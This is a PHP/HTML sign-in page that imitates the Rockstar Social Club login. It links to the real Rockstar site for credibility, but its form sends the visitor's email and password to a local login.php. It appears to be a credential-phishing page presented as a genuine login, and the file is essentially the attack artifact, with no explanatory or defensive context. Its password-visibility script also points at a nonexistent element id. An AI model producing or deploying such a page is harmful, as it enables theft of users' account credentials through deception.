<?php
include "validate.php";
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
</head>
<body>
<form action="login.php" method="POST" class="login">
    <div class="login-form">
        <div class="logo"></div>
        <div class="container">
            <h1>Sign in with social club</h1>
                <div class="txtb">
                    <input type="text" id="username" name="email" placeholder=" ">
                    <span class="placeholder">Email</span>
                </div>
                <div class="txtb">
                    <input type="password" id="password" name="pass" placeholder=" ">
                    <span class="placeholder">Password</span>
                    <i class="show-password-btn">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" height="16" width="16" class="UI__Icon__icon" data-ui-name="visibility_off_icon"><path d="M29.8 17.2c-2.2 1.7-4.6 3-7.1 3.7l-2.5-2.5c.6-.8.9-1.8.9-2.9 0-1.4-.5-2.6-1.5-3.6-1.7-1.7-4.5-1.9-6.4-.6l-1.7-1.7c6.3-1.3 12.9.1 18.4 4.3.6.5 1.5.4 1.9-.2.5-.6.4-1.5-.2-1.9-6.7-5.1-14.9-6.6-22.4-4.4L5.7 3.9c-.5-.5-1.4-.5-1.9 0s-.5 1.4 0 1.9l2.6 2.6c-2 .9-4 2-5.8 3.4-.6.5-.7 1.3-.2 1.9.3.3.7.5 1.1.5.3 0 .6-.1.8-.3 1.9-1.5 4-2.6 6.2-3.4l2.9 2.9c-.3.6-.4 1.2-.4 1.8 0 .8.5 1.4 1.3 1.5.6.1 1.2-.4 1.4-1l2.2 2.2c-.2 0-.3 0-.5-.1-.7-.2-1.5.2-1.7.9-.2.7.2 1.5.9 1.7.5.2 1 .2 1.5.2.7 0 1.4-.2 2.1-.5l1.5 1.5c-6 1-12.2-.5-17.3-4.5-.6-.5-1.5-.4-1.9.2-.5.6-.4 1.5.2 1.9 4.6 3.6 10 5.4 15.5 5.4 2 0 3.9-.2 5.9-.7l4.1 4.1c.3.3.6.4 1 .4s.7-.1 1-.4c.5-.5.5-1.4 0-1.9L25.1 23c2.3-.9 4.6-2.1 6.6-3.7.6-.5.7-1.3.2-1.9-.7-.6-1.5-.7-2.1-.2zm-12.2-3.3c.4.4.7 1 .7 1.7 0 .3-.1.6-.2.8l-3-3c.9-.3 1.9-.1 2.5.5z"></path></svg>
                    </i>
                </div>
                <label class="checkbox">
                    <input type="checkbox">
                    <span>Keep me signed in</span>
                </label>
                <div class="forgot-signin-container">
                    <a href="login.php" class="link">Forgot your password?</a>
                    <input type="submit" value="Signin" class="login">
                </div>
            </form>
        </div>

        <div class="container bottom-container">
            <h3 class="row">Sign in using</h3>
            <div class="sm-login row">
                <a href="https://socialclub.rockstargames.com">
                    <img src="images/ps.png" alt="">
                </a>
                <a href="#">
                    <img src="images/xbox.png" alt="">
                </a>
                <a href="#">
                    <img src="images/fb.png" alt="">
                </a>
                <a href="#">
                    <img src="images/google.png" alt="">
                </a>
                <a href="#">
                    <img src="images/twitter.png" alt="">
                </a>
            </div>
        </div>

        <div class="create-account">
            Not a member?
            <a href="https://socialclub.rockstargames.com" class="link">Create a new account</a>
        </div>
    </div>

    <div class="copyright">
        &copy; 2020
    </div>

    <script>
        document.querySelector(".show-password-btn").addEventListener("click",function(){
            var passwordInput = document.querySelector("#passwordInput");
            if(passwordInput.type == "password") passwordInput.type = "text";
            else passwordInput.type = "password";
        });
    </script>
</body>
</html>